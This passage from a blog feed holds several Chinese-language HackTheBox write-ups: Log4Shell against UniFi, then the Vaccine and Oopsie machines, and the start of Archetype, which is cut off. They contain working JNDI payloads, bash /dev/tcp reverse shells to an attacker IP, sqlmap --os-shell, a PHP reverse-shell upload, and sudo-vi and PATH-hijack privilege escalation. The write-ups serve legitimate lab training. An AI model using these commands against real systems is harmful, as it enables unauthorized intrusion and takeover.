    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>这篇博客探讨了利用 Log4J 漏洞攻击一个非常知名的网络设备监控系统——“UniFi” 的效果。通过利用 Log4J 漏洞，并篡改名为 remember 的 POST 头，来攻击 UniFi，从而获取该机器的反向 shell。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><p>nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241220185929.png"></p><p>开放了四个端口，但是好像没得到别的有用信息。换个参数再详细扫描一次，发现两条有用信息：</p><p><img src="/../images/Pasted%20image%2020241220191700.png"></p><p><img src="/../images/Pasted%20image%2020241220192200.png"></p><p>nmap 尝试连接 8080 端口并获取页面标题，但它发现该 HTTP 服务进行了重定向。重定向的目标是 <code>https://10.129.180.69:8443/manage</code>，该页面标题是 UniFi Network。访问这个链接：</p><p><img src="/../images/Pasted%20image%2020241220192536.png"></p><p>可以看到 UniFi 登录页面，版本号为 6.4.54。UniFi 是一个知名的网络设备监控系统。那么现在想到的第一件事久是谷歌搜索这个版本有没有被爆出来的漏洞。通过搜索关键词 <code>UniFy 6.4.54 exploit</code>，找到一篇文章：<a href="https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi">另一个着火的 Log4j：Unifi |链轮安全 — Another Log4j on the fire: Unifi | Sprocket Security</a>，利用 <strong>Log4Shell</strong> 漏洞（CVE-2021-44228）实现对 UniFi 的攻击。</p><ul><li><p><strong>Log4J</strong></p><ul><li>Log4J 是一个流行的 Java 日志记录库，它被广泛用于 Java 应用程序中，用于生成日志输出。</li><li>允许开发者在 Java 程序中记录运行时信息、错误、警告等。</li><li>支持多种输出目标（如控制台、文件、数据库等）</li><li>支持不同格式的输出，比如包括时间戳、日志级别、线程名等。</li></ul></li><li><p><strong>Log4Shell</strong></p><ul><li>该漏洞允许攻击者通过恶意构造的日志消息触发远程代码执行（RCE）。</li><li>Log4J 的 <code>lookup</code> 功能支持 JNDI（Java Naming and Directory Interface）查找，它允许日志信息中的特定字符串动态替换。</li><li>攻击者可以在日志消息中插入包含 JNDI 查找请求的恶意代码，如 <code>$&#123;jndi:ldap://attacker.com/malicious&#125;</code>。</li><li>由于 Log4J 不对 JNDI 查找请求做充分的验证，攻击者可以通过上述方式使得 Log4J 向恶意服务器发起请求，加载并执行远程的恶意代码。</li><li>避免该漏洞的最佳方式是升级到 Log4J 2.16.0 或更高版本，以上版本已禁用 JNDI 查找功能。</li></ul></li></ul><p>首先抓个登录包：</p><p><img src="/../images/Pasted%20image%2020241220202547.png"></p><p>前面那篇文章提到 payload 应该放在 remember 参数中：</p><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/10.10.16.6/whatever</span>&#125;<br><br><span class="hljs-comment"># JNDI:通过调用该 API，应用程序可以定位资源和其他程序对象。资源是提供与系统（如数据库服务器和消息系统）连接的程序对象。</span><br><br><span class="hljs-comment"># LDAP:轻量级目录访问协议,默认运行在 389 端口。</span><br></code></pre></td></tr></table></figure><p>由于 POST 数据是作为 JSON 对象发送的，但 payload 也有方括号 {} ，为了防止将其解析为另一个 JSON 对象，将其放在双引号内，以便将其解析为字符串：</p><p><img src="/../images/Pasted%20image%2020241220210130.png"></p><p>点击发送之后，响应包显示 payload 无效：</p><p><img src="/../images/Pasted%20image%2020241220210101.png"></p><p>尽管如此，payload 实际上正在执行。在端口 389 上启动 tcpdump ，它将监控 LDAP 连接的网络流量：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> tcpdump -i tun0 port <span class="hljs-number">389</span><br></code></pre></td></tr></table></figure><p>tcpdump 输出显示我们的机器上正在接收一个连接。这证明该应用程序确实容易受到攻击：</p><p><img src="/../images/Pasted%20image%2020241220211316.png"></p><p>为了构建可以发送到服务器的 payload，并实现远程代码执行，我们必须在系统上安装 Open-JDK 和 Maven：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">sudo apt update<br>sudo apt <span class="hljs-keyword">install </span>openjdk<span class="hljs-number">-11</span>-<span class="hljs-keyword">jdk </span>-y<br><span class="hljs-keyword">java </span>-version<br><span class="hljs-comment"># Open-JDK 是 Java 开发工具包，用于构建 Java 应用程序。</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br><span class="hljs-built_in">sudo</span> apt-get install maven<br>mvn -v<br><span class="hljs-comment"># Maven 是一个集成开发环境 （IDE），用于创建结构化项目并将项目编译成 jar 文件.</span><br></code></pre></td></tr></table></figure><p>安装所需的软件包后，需要下载并构建 Rogue-JNDI ，这是一个用于 JNDI 注入攻击的恶意 LDAP 服务：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/veracode-research/rogue-jndi <br><span class="hljs-built_in">cd</span> rogue-jndi <br>mvn package<br></code></pre></td></tr></table></figure><p>这将在 rogue-jndi&#x2F;target&#x2F; 目录中创建一个 名为 RogueJndi-1-1.jar 的Java 应用程序。<br><img src="/../images/Pasted%20image%2020241221132759.png"></p><p>构造一个实现反弹 shell 的 payload，为防止出现编码问题，对其进行 base64 编码：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">echo</span> &#x27;bash -c bash -i &gt;&amp;/dev/tcp/<span class="hljs-number">10.10.16.6</span>/<span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>&#x27; | base64<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221135413.png"></p><p>接下来 启动 Rogue-JNDI 应用程序，并传递 payload：</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">java</span> -<span class="hljs-string">jar</span> <span class="hljs-string">target</span>/<span class="hljs-string">RogueJndi-1</span>.<span class="hljs-string">1</span>.<span class="hljs-string">jar</span> <span class="hljs-built_in">--command</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuNi84ODggMD4mMQo=</span><br><span class="hljs-string">&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="hljs-built_in">--hostname</span> <span class="hljs-string">&quot;10.10.16.6&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241221135610.png"></p><p>本地开启一个监听端口 8888。回到 BurpSuite 将 payload 改为</p><figure class="highlight crystal"><table><tr><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/10.10.16.6:1389/o</span>=tomcat&#125;<br></code></pre></td></tr></table></figure><p>发送之后，rogue 服务器显示以下内容：</p><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">Sending LDAP ResourceRef <span class="hljs-literal">result</span> <span class="hljs-keyword">for</span> o=tomcat <span class="hljs-keyword">with</span> javax.el.ELProcessor payload<br></code></pre></td></tr></table></figure><p>然后监听端口处应该成功获得目标主机的 shell ，但是我反复尝试多次均失败，于是放弃，了解了这个思路就好。</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场复现失败了，但也是有收获的。以后在渗透过程中，要做好信息收集，目标是否存在已被爆出的漏洞也是重要的一部分。除此之外，也了解了 java 相关的一些知识。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;这篇博客探讨了利用 Log4J 漏洞攻击一个非常知名的网络设</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Vaccine</title>
    <link href="http://example.com/2024/12/20/Hack-The-Box-Vaccine/"/>
    <id>http://example.com/2024/12/20/Hack-The-Box-Vaccine/</id>
    <published>2024-12-20T03:36:34.000Z</published>
    <updated>2024-12-20T09:24:45.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>看完这篇博客，你会了解到 ftp 匿名登录、John the Ripper 爆破密码、sqlmap、升级临时 shell、ssh、GTFOBins等。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描开放端口：</p><p><img src="/../images/Pasted%20image%2020241220115219.png"></p><p>先从 ftp 入手，因为我们看到它允许匿名登录，而且有一个 backup.zip。</p><p>首先连接 ftp 服务器：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">10.129.116.3</span><br><span class="hljs-comment"># 用户名：anonymous 或 ftp</span><br><span class="hljs-comment"># 密码 ：任意字符</span><br></code></pre></td></tr></table></figure><p>下载 backup.zip:</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">get</span> backup.zip<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220120901.png"></p><p>解压，发现需要密码：</p><p><img src="/../images/Pasted%20image%2020241220121127.png"></p><p>之前介绍过 <strong>John the Ripper</strong> 工具，它可以破解多种加密算法生成的密码哈希，例如 DES、MD5、SHA、bcrypt、Windows LM&#x2F;NTLM 哈希、ZIP 文件密码、PDF 文件密码等。</p><p>对于 ZIP 文件，需要使用 <code>zip2john</code> 工具提取哈希：</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">zip2john <span class="hljs-keyword">backup.zip </span>&gt; hashes<br></code></pre></td></tr></table></figure><p>然后加载字典，对以上哈希值进行暴力破解：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">john <span class="hljs-attribute">-wordlist</span>=Desktop/wordlists/rockyou.txt hashes<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220123408.png"></p><p>查看 index.php，发现管理员密码：</p><p><img src="/../images/Pasted%20image%2020241220123843.png"></p><p><img src="/../images/Pasted%20image%2020241220124943.png"></p><p>浏览器访问 <a href="http://10.129.116.3/">http://10.129.116.3</a> ，登录管理员账号：</p><p><img src="/../images/Pasted%20image%2020241220125130.png"></p><p>这个功能一定是和数据库连接的:</p><p><img src="/../images/Pasted%20image%2020241220134002.png"></p><p>接下来使用 SQLmap 测试是否存在 SQL 注入。注意这里我们是用管理员身份登录的，所以一定要带上 cookie：</p><p><img src="/../images/Pasted%20image%2020241220135057.png"></p><figure class="highlight abnf"><table><tr><td class="code"><pre><code class="hljs abnf">sqlmap -u <span class="hljs-string">&quot;http://10.129.116.3/dashboard.php?search=Elixir&quot;</span> --cookie<span class="hljs-operator">=</span><span class="hljs-string">&quot;PHPSESSID=23gd5c0ih2s72tfon818qq9f4s&quot;</span><br></code></pre></td></tr></table></figure><p>结果是 search 参数容易受到 sql 注入的攻击：</p><p><img src="/../images/Pasted%20image%2020241220135713.png"></p><p>接下来使用<code>--os-shell</code>参数执行命令注入：</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u <span class="hljs-string">&quot;http://10.129.116.3/dashboard.php?search=Elixir&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;PHPSESSID=23gd5c0ih2s72tfon818qq9f4s&quot;</span> <span class="hljs-params">--os-shell</span><br></code></pre></td></tr></table></figure><p>虽然通过 OS-shell 获得了命令行控制，但它只在当前会话有效，并且权限可能会受到限制。为了拥有更强的远程控制能力、绕过防火墙的能力和更持久的连接，我们还是像以前一样执行反弹 shell：</p><figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.16.6/888 0&gt;&amp;1&quot;</span><br># bash -<span class="hljs-keyword">c</span> 启动一个新的 Bash 实例隔离环境，确保反向 shell 能顺利启动。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">888</span><br></code></pre></td></tr></table></figure><p>升级 shell，使其成为一个完全的交互式 shell。</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>找到 user flag:<br><img src="/../images/Pasted%20image%2020241220150955.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来进行权限提升。使用 <code>sudo -l</code> 查看当前用户的 sudo 权限，判断是否有潜在的提权漏洞。但是首先我们要找到当前用户的密码。</p><p>猜测网站目录下应该有明文密码。最终在 &#x2F;var&#x2F;www&#x2F;html&#x2F;dashboard.php 中找到了当前用户的密码：<br><img src="/../images/Pasted%20image%2020241220153202.png"></p><p>shell 总是自动断开，由于目标主机的 22 端口处于开放状态，所以得到密码之后我们可以用 ssh 远程登录：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> postgres@<span class="hljs-number">10.129.116.3</span><br></code></pre></td></tr></table></figure><p>然后 <code>sudo -l</code>：</p><p><img src="/../images/Pasted%20image%2020241220154417.png"></p><p>当处于只有某些二进制文件可用的情况下时，如何获得 root 权限可以参考<a href="%5BGTFOBins%5D(https://gtfobins.github.io/)">GTFOBins</a>。</p><p>当前用户可以使用 <code>vi</code> ，查找相应的文档：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">// <span class="hljs-keyword">If</span> the binary <span class="hljs-keyword">is</span> allowed <span class="hljs-keyword">to</span> run <span class="hljs-keyword">as</span> <span class="hljs-keyword">superuser</span> <span class="hljs-keyword">by</span> `sudo`, it does <span class="hljs-keyword">not</span> <span class="hljs-keyword">drop</span> the elevated <span class="hljs-keyword">privileges</span> <span class="hljs-keyword">and</span> may be used <span class="hljs-keyword">to</span> <span class="hljs-keyword">access</span> the file <span class="hljs-keyword">system</span>, escalate <span class="hljs-keyword">or</span> maintain privileged <span class="hljs-keyword">access</span>.<br><br>sudo vi -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p>在此场景中，<code>sudo</code> 会使得 <code>vi</code> 编辑器以 root 身份运行，而 <code>vi</code> 中的 <code>:!/bin/sh</code> 命令又会启动一个新的 shell。因此，整个过程不会放弃 root 权限，攻击者可以利用这种方式获取到系统的 root 权限。因此我们执行：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf -c <span class="hljs-string">&#x27;:!/bin/sh&#x27;</span> /dev/<span class="hljs-keyword">null</span><br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220163003.png"></p><p>因为当前用户的 sudo 权限仅限于 <code>/bin/vi/etc/postgresql/11/main/pg_hba.conf</code> ，所以这种方法不可行。文档中还有一种方法:</p><p><img src="/../images/Pasted%20image%2020241220163300.png"></p><p>于是</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf<br></code></pre></td></tr></table></figure><p>在 <code>vi</code> 编辑器中按冒号执行以下命令：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">set</span> <span class="hljs-keyword">shell</span>=/bin/<span class="hljs-keyword">sh</span><br># 将 `<span class="hljs-keyword">vi</span>` 编辑器的外部 <span class="hljs-keyword">shell</span> 设置为 `/bin/<span class="hljs-keyword">sh</span>`<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241220164222.png"></p><p>按下回车后，输入以下命令：</p><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">shell</span><br># 启动一个外部 <span class="hljs-keyword">shell</span>，<span class="hljs-keyword">vi</span> 编辑器会临时退出。<br></code></pre></td></tr></table></figure><p>成功获取 root 权限和 root flag：</p><p><img src="/../images/Pasted%20image%2020241220164820.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>这个靶场相对来说简单一些，整个过程中用到的知识，很多都是以前学习过的，但是我并没有完全掌握。应该以后用多了就熟能生巧了吧，希望是这样的哈哈哈。最大的收获是，了解了在只有某些二进制文件可用时的提权手段。继续坚持学吧，虽然不知道能坚持到什么时候。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;看完这篇博客，你会了解到 ftp 匿名登录、John the</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Oopsie</title>
    <link href="http://example.com/2024/12/19/Hack-The-Box-Oopsie/"/>
    <id>http://example.com/2024/12/19/Hack-The-Box-Oopsie/</id>
    <published>2024-12-19T05:29:50.000Z</published>
    <updated>2024-12-20T07:20:22.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>在寻找 WEB 漏洞时，始终要检查cookie、session，并尝试弄清楚访问控制是如何工作的。在许多情况下，远程代码执行和系统的控制权限可能无法单独实现，而是需要将不同类型的漏洞和利用方法结合起来。在本篇博客中，你将学习到，信息泄露和访问控制漏洞这类看似不太重要的漏洞。即使是小漏洞在攻击时也可能会产生巨大影响。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描端口： </p><p><img src="/../images/Pasted%20image%2020241219134020.png"></p><p>访问 <a href="http://10.129.180.28/">http://10.129.180.28</a>:</p><p><img src="/../images/Pasted%20image%2020241219134256.png"></p><p>打开 BurpSuite 的 Target 模块，Site Map功能可以看到目标网站的结构：</p><p><img src="/../images/Pasted%20image%2020241219141112.png"></p><p>发现了一个登录界面：</p><p><img src="/../images/Pasted%20image%2020241219141225.png"></p><p>以访客身份登录：</p><p><img src="/../images/Pasted%20image%2020241219142614.png"></p><p>唯一可操作的就是 uploads 界面，但是需要超级管理员权限：</p><p><img src="/../images/Pasted%20image%2020241219142747.png"></p><p>一种思路就是查看 cookie 或 seesion，是否有操作空间转换为管理员身份：</p><p><img src="/../images/Pasted%20image%2020241219143134.png"></p><p>可以看到，cookie 中有个值就是 Access ID。那么只需获取到 admin 的 Access ID，就可以伪造管理员身份。而 URL 中有个 id 变量，就可以切换账户。凭此漏洞，我们发现，将 id 改为1，显示出了 admin 的 Access ID：</p><p><img src="/../images/Pasted%20image%2020241219143952.png"></p><p>更改cooike，即可访问 uploads 页面：</p><p><img src="/../images/Pasted%20image%2020241219144121.png"></p><p>这里尝试上传后门失败了，查看题解发现可以上传执行反弹 shell 的文件，插件分析出的语言类型是php。</p><p>首先要知道文件上传到哪了。用 gobuster 进行目录爆破：</p><figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gobuster</span> dir -u http://<span class="hljs-number">10.129.180.28</span> -w wordlists/dirbuster/directory-list-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>-small.txt<br></code></pre></td></tr></table></figure><p>果然是 uploads 文件夹：</p><p><img src="/../images/Pasted%20image%2020241219151440.png"></p><p>然后上传 PHP 反弹shell。Kali Linux自带此类文件，在 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F; 目录下。也可以从<a href="https://github.com/BlackArch/webshells">BlackArch&#x2F;webshells: Various webshells. We accept pull requests for additions to this collection.</a>下载。</p><p>本机开启一个监听端口：</p><p><img src="/../images/Pasted%20image%2020241219152611.png"></p><p>php-reverse-shell.php 更改主机 ip 和端口：</p><p><img src="/../images/Pasted%20image%2020241219152457.png"></p><p>上传这个文件，然后在浏览器访问我们上传的shell：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">180.28</span><span class="hljs-regexp">/uploads/</span>php-reverse-shell.php<br></code></pre></td></tr></table></figure><p>成功执行反弹 shell。</p><p>输入 <code>whoami</code> 命令，发现当前用户是 www-data：<br><img src="/../images/Pasted%20image%2020241219174655.png"></p><p>在 Linux 系统中，<code>/etc/passwd</code> 是一个非常重要的系统文件，它存储了系统中的所有用户账户信息。每一行代表一个用户的信息，每个字段用冒号分隔：</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-title">用户名:密码:用户ID:组ID:注释:主目录:</span>登录Shell<br><br># 用户名（Username）：这是用户的登录名，例如 `root` 或 `user1`。<br><br># 密码（Password）：通常是加密的用户密码。但在大多数现代系统中，实际的密码通常存储在 `/etc/shadow` 文件中，而不是 `/etc/passwd`。在旧的系统中，这里可能直接保存加密后的密码（如 `x` 或 `*`）。<br><br># 用户ID（UID）：用户的唯一数字标识符。每个用户都有一个唯一的 UID，`root` 用户通常是 UID <span class="hljs-number">0</span>。<br>    <br># 组ID（GID）：该用户的主组的 GID。每个用户属于一个默认的主组（通常与用户名相同），并且可能属于其他附加组。<br>    <br># 注释（GECOS）：这通常用于存储关于用户的额外信息，如全名、电话号码等。很多系统中，这个字段也可以为空。<br>    <br># 主目录（Home Directory）：用户登录后默认进入的目录。例如，`/home/user1` 是用户 `user1` 的主目录。如果该字段为空，通常表示该用户没有指定的主目录。<br>    <br># 登录Shell（Login Shell）：用户登录后使用的 shell。常见的 shell 如 `/bin/bash`、`/bin/sh` 等。对于不需要登录的用户，可能会设置为 `/sbin/nologin` 或 `/bin/<span class="hljs-literal">false</span>`。<br></code></pre></td></tr></table></figure><p>执行 <code>cat /etc/passwd</code>，发现了两个需要登录的用户：</p><p><img src="/../images/Pasted%20image%2020241219163000.png"></p><p>切换到 &#x2F;home&#x2F;robert，发现 user flag:</p><p><img src="/../images/Pasted%20image%2020241219163253.png"></p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><p>接下来尝试能否切换为 robert 用户。首先要找到登录密码。网站服务器是 Apache，其文件通常托管在 <code>/var/www/html/</code> 下，在此目录找到了数据库文件 db.php：</p><p><img src="/../images/Pasted%20image%2020241219180418.png"></p><p> <code>su robert</code>切换为 robert 用户，出现错误：</p><p><img src="/../images/Pasted%20image%2020241219181328.png"></p><p>因为我们使用的是一个 php shell，不能算作终端。使用以下命令升级 shell：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">SHELL</span>=/bin/bash<span class="hljs-built_in"> script </span>-q /dev/<span class="hljs-literal">null</span><br>stty<span class="hljs-built_in"> raw </span>-echo<br>reset<br>xterm<br></code></pre></td></tr></table></figure><p>登录成功：</p><p><img src="/../images/Pasted%20image%2020241219182527.png"></p><p>使用 <code>id</code> 命令用于显示当前用户 ID（UID）、组 ID（GID）以及所属的附加组（group）：</p><p><img src="/../images/Pasted%20image%2020241219183005.png"></p><p>观察到用户 robert 属于组 bugtracker 。group（组） 是 Linux 系统中用于管理用户权限的一种机制，可以让一组用户共享相同的访问权限。</p><p>查看属于该组的所有文件：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -group bugtracker <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>只有一个 <code>bugtracker</code> 文件：</p><p><img src="/../images/Pasted%20image%2020241219184553.png"></p><p>执行以下命令查看文件的详细信息及类型：</p><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">ls -la <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/bugtracker &amp;&amp; file /u</span>sr<span class="hljs-regexp">/bin/</span>bugtracker<br></code></pre></td></tr></table></figure><p><img src="/../images/Pasted%20image%2020241219185502.png"></p><p>这里需要了解有关 SUID（Set owner User ID）的知识。</p><p>在 Unix&#x2F;Linux 系统中，SUID 是一种文件权限设置。当一个<strong>二进制程序（可执行文件）</strong>具有 SUID 权限时，它在执行时将<strong>继承文件所有者的权限</strong>，而不是执行该程序的用户的权限。它的设置通常用来允许普通用户以其他用户的权限（比如 root）来执行某些特定程序，而不需要更高的权限。</p><p>执行这个文件：</p><p><img src="/../images/Pasted%20image%2020241219192826.png"></p><p>发现该工具接受用户输入作为 <code>cat</code> 命令读取的文件的名称。但是这个 <code>cat</code> 不是一个绝对路径，所以我们可以插入我们自己构造的 <code>cat</code> 并将其添加到路径中，这样那个 <code>cat</code> 就会以 root 身份执行。</p><p>要获取 shell，我们需要打开 <code>/bin/sh</code>，由于 <code>bugtracker</code> 文件以 root 身份执行，因此这将创建一个 root shell。但是不能直接写入 <code>/usr/bin</code>，因为 robert 没有权限。可以把它写在 <code>/tmp</code>下：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Filename: <span class="hljs-built_in">cat</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Location: /tmp</span><br>/bin/sh<br></code></pre></td></tr></table></figure><p>这里用 vi 和 vim 都没写成功，最后用 echo 成功了。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/sh&#x27;</span> &gt; <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p>给 cat 添加执行权限：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span><br></code></pre></td></tr></table></figure><p>为了执行这个 <code>cat</code>命令，需要将 &#x2F;tmp 目录添加到 PATH 环境变量中：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/tmp:$PATH<br></code></pre></td></tr></table></figure><p>检查环境变量：</p><p><img src="/../images/Pasted%20image%2020241219204609.png"></p><p>再次运行 bugtracker, 此时以获取了 root 权限。<br><img src="/../images/Pasted%20image%2020241219205012.png"></p><p>找到 root flag:</p><p><img src="/../images/Pasted%20image%2020241219205247.png"></p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>本以为这个靶场会做得比较快，大大高估自己了。不过了解到了一些以前从未涉及过的思路，对 Linux 命令和文件系统也更加熟悉了。但是有些知识还是记不住，博客写完了不能就放那不看了，还是得经常回顾。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;在寻找 WEB 漏洞时，始终要检查cookie、sessio</summary>
      
    
    
    
    
    <category term="HackTheBox" scheme="http://example.com/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>Hack The Box-Archetype</title>
    <link href="http://example.com/2024/12/17/Hack-The-Box-Archetype/"/>
    <id>http://example.com/2024/12/17/Hack-The-Box-Archetype/</id>
    <published>2024-12-17T02:01:40.000Z</published>
    <updated>2024-12-21T10:14:46.177Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>通过这篇博客，你会了解到 SMB 协议、smbclient 命令、Microsoft SQL Server 、Impacket工具、xp_cmdshell命令、winPEAS工具、windows权限提升等知识，并对 nmap 和反弹 shell 的使用更加娴熟。</p><h1 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h1><h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><p>nmap 扫描目标主机端口：</p><p><img src="/../images/Pasted%20image%2020241217101741.png"></p><p>我们发现 SMB 端口是开放的，并且 Microsoft SQL Server 2017 正在端口 1433 上运行。</p><ul><li><strong>SMB</strong><ul><li>SMB（Server Message Block）是一种网络文件共享协议，常用于 Windows 操作系统中，用于允许应用程序读取和写入远程计算机上的文件以及请求计算机上的服务。SMB 协议不仅支持文件共享，还支持打印机共享、网络浏览等功能。</li><li>SMB 主要通过端口 <strong>445</strong> 进行通信。</li></ul></li></ul><p>使用 smbclient 与运行 SMB 协议的远程服务器进行交互：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">smbclient <span class="hljs-punctuation">-</span>N <span class="hljs-punctuation">-</span>L <span class="hljs-comment">//10.129.111.223</span><br><span class="hljs-meta">#-N : 